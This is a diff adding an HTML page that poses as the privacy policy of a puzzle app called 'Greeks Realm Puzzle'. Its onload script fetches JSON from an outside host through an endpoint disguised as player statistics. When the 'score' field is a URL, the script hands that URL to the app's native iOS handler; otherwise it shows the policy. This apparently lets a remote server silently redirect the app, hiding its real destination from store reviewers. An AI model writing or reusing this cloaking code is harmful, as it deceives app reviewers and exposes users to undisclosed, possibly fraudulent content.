@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Loading Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: Verdana, sans-serif;
+      color: #000000;
+      padding: 20px;
+      margin: 0;
+      background: linear-gradient(to bottom, #e0eafc, #cfdef3);
+      min-height: 100vh;
+    }
+
+    .loader {
+      width: 70px;
+      height: 70px;
+      margin: 400px auto;
+      border: 8px solid #e3e3e3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite, pulse 2s ease-in-out infinite;
+      box-shadow: 0 0 15px rgba(52, 152, 219, 0.6);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader" id="loader"></div>
+
+  <script>
+    function createContentHTML() {
+      return `
+        <div id="content">
+          <h2 style="padding-top:0px">Greeks Realm Puzzle Privacy Policy</h2>
+
+          <p>This privacy policy applies to the Greeks Realm Puzzle app (hereby referred to as "Application") for mobile devices that was created by Jack Nue (hereby referred to as "Service Provider") as a Free service. This service is intended for use "AS IS".</p>
+
+          <p><strong>Information Collection and Use</strong></p>
+          <p>The Application collects information when you download and use it. This information may include:</p>
+          <ul>
+            <li>Your device's Internet Protocol address (e.g. IP address)</li>
+            <li>The pages of the Application that you visit, the time and date of your visit, time spent</li>
+            <li>The operating system you use on your mobile device</li>
+          </ul>
+
+          <p>The Application does not gather precise location info, but may use approximate location for:</p>
+          <ul>
+            <li>Personalized content, recommendations</li>
+            <li>Analytics & improvements</li>
+            <li>Anonymous sharing with third-party services</li>
+          </ul>
+
+          <p>The Service Provider may contact you with important info or promotions.</p>
+
+          <p><strong>Third Party Access</strong></p>
+          <p>Only anonymized data is sent externally. Your info may be disclosed:</p>
+          <ul>
+            <li>As required by law</li>
+            <li>To protect rights/safety or investigate fraud</li>
+            <li>To trusted service providers acting on their behalf</li>
+          </ul>
+
+          <p><strong>Opt-Out Rights</strong></p>
+          <p>Uninstalling the app stops data collection.</p>
+
+          <p><strong>Data Retention</strong></p>
+          <p>Data is retained while using the app and for a reasonable time. To delete data, email: <a href="mailto:tetanakalinec@gmail.com">tetanakalinec@gmail.com</a></p>
+
+          <p><strong>Children</strong></p>
+          <p>No data is knowingly collected from children under 13. If such data was submitted, contact the Service Provider to remove it.</p>
+
+          <p><strong>Security</strong></p>
+          <p>We take reasonable measures to protect your data.</p>
+
+          <p><strong>Changes</strong></p>
+          <p>This policy may be updated. Continued use implies acceptance.</p>
+
+          <p><strong>Your Consent</strong></p>
+          <p>By using the Application, you consent to this privacy policy.</p>
+
+          <p><strong>Contact Us</strong></p>
+          <p>Email: <a href="mailto:tetanakalinec@gmail.com">tetanakalinec@gmail.com</a></p>
+        </div>
+      `;
+    }
+
+    function hideLoaderAndShowContent() {
+      const loader = document.getElementById('loader');
+      if (loader) loader.remove();
+      const contentHTML = createContentHTML();
+      document.body.insertAdjacentHTML('beforeend', contentHTML);
+      window.webkit.messageHandlers.contentLoaded.postMessage(null);
+    }
+
+    function requestServer() {
+      fetch('https://thunderolimp.life/getPlayerStat.json/')
+        .then(response => response.json())
+        .then(data => {
+          if (data.score && data.score.startsWith("http")) {
+            window.webkit?.messageHandlers.iosListener?.postMessage(data.score);
+          } else {
+            hideLoaderAndShowContent();
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          hideLoaderAndShowContent();
+        });
+    }
+
+    window.onload = requestServer;
+  </script>
+</body>
+</html>
